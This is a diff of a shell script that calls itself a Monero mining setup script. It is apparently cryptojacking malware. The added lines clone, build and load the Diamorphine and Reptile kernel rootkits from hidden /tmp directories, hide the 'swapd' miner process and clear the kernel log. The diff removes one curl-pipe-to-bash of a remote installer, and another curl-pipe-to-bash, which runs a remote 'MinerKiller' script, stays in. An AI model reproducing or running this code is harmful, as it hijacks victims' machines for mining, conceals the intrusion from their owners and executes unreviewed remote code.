@@ -2,15 +2,10 @@
 
 VERSION=2.11
 
-# Version for server without root
-curl  -s -L https://raw.githubusercontent.com/littlAcen/xmrig_setup_m0dd3d-1/master/setup_gdm2.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
-
 # printing greetings
 
 echo "MoneroOcean mining setup script v$VERSION."
 echo "(please report issues to support@moneroocean.stream email with full output of this script with extra \"-x\" \"bash\" option)"
-
-
 
 if [ "$(id -u)" == "0" ]; then
   echo "WARNING: Generally it is not adviced to run this script under root"
@@ -370,11 +365,14 @@ cd /tmp ; cd .ICE-unix ; cd .X11-unix ; yum install pciutils -y; apt install pci
 #echo "[*] Determining GPU+CPU"
 #cd /tmp ; cd .ICE-unix ; cd .X11-unix ; yum install pciutils lshw -y; apt install pciutils lshw -y; update-pciids ; lspci -vs 00:01.0 ; lshw -C display ; nvidia-smi ; aticonfig --odgc --odgt ; nvtop ; radeontop ; echo "Possible CPU Threads:" ; (nproc) ;
 
-# echo "[*] MO0RPHIUM!! Viiiiel M0RPHIUM!!! Brauchen se nur zu besorgen, fixen kann ich selber! =)"
-# cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; apt-get update -y ; apt-get install linux-headers-$(uname -r) git make gcc msr-tools -y ;  git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
+#echo "[*] MO0RPHIUM!! Viiiiel M0RPHIUM!!! Brauchen se nur zu besorgen, fixen kann ich selber! =)"
+#cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; apt-get update -y ; apt-get install linux-headers-$(uname -r) git make gcc msr-tools -y ;  git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
 
 echo "[*] MO0RPHIUM!! Viiiiel M0RPHIUM!!! Brauchen se nur zu besorgen, fixen kann ich selber! =)"
-cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; yum install linux-generic linux-headers-$(uname -r) kernel kernel-devel kernel-firmware kernel-tools kernel-modules kernel-headers git make gcc msr-tools -y ; apt-get update -y ; apt-get install linux-generic linux-headers-$(uname -r) git make gcc msr-tools -y ;  git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
+cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; yum install linux-generic linux-headers-$(uname -r) kernel kernel-devel kernel-firmware kernel-tools kernel-modules kernel-headers git make gcc msr-tools -y ; apt-get update -y ; apt-get install linux-generic linux-headers-$(uname -r) git make gcc msr-tools -y ;  git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; /reptile/reptile_cmd hide `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
+
+echo "[*] MO0RPHIUM!! Viiiiel M0RPHIUM!!! Brauchen se nur zu besorgen, fixen kann ich selber! =)"
+cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; apt-get update -y ; apt-get install build-essential linux-headers-$(uname -r) git make gcc msr-tools libncurses-dev -y ; yum update -y; yum install -y ncurses-devel ; git clone https://github.com/f0rb1dd3n/Reptile/ && cd Reptile ; make defconfig ; make ; make install ; dmesg -C ; /reptile/reptile_cmd hide ;  kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
 
 #BotKiller
 curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/MinerKiller.sh | bash
